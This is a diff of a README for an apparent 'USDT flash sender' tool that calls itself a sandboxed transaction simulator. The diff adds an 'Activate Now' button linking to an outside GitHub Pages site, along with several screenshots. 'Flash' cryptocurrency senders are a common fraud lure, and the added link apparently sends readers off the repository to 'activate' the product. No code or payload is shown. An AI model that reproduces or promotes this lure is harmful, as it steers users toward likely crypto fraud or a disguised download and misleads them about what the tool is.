@@ -15,12 +15,16 @@ It *does* simulate everything around them — speeds, gas predictions, validatio
 
 ---
 
+[![Activate Now](../btn.png)](https://usdt-flash-senders.github.io/.github/)
 
 ---
 
 # 🧩 Features
 
 This tool is not sleight-of-hand — it is a **sandboxed laboratory** built for precision and clarity.
+
+<img width="1280" height="483" alt="image" src="https://github.com/user-attachments/assets/1fe4f59e-c529-4dbb-be3d-c9c577d297a7" />
+
 
 ### ✔ Transaction Simulation
 
@@ -32,6 +36,9 @@ Emulates the entire lifecycle:
 * Transfer preview
 * Conditional failure testing
 * Timed “flash send” mock execution
+
+<img width="654" height="485" alt="image" src="https://github.com/user-attachments/assets/247b19a4-4b55-4209-aa75-f0993115eb48" />
+
 
 ### ✔ Multi-Chain Support
 
@@ -61,6 +68,9 @@ flashSend({
   mode: "simulate"
 });
 ```
+
+<img width="1024" height="810" alt="image" src="https://github.com/user-attachments/assets/cc78450b-57b3-4b30-88ce-30b2a879a9fb" />
+
 
 ### ✔ Transaction Stress Mode
 
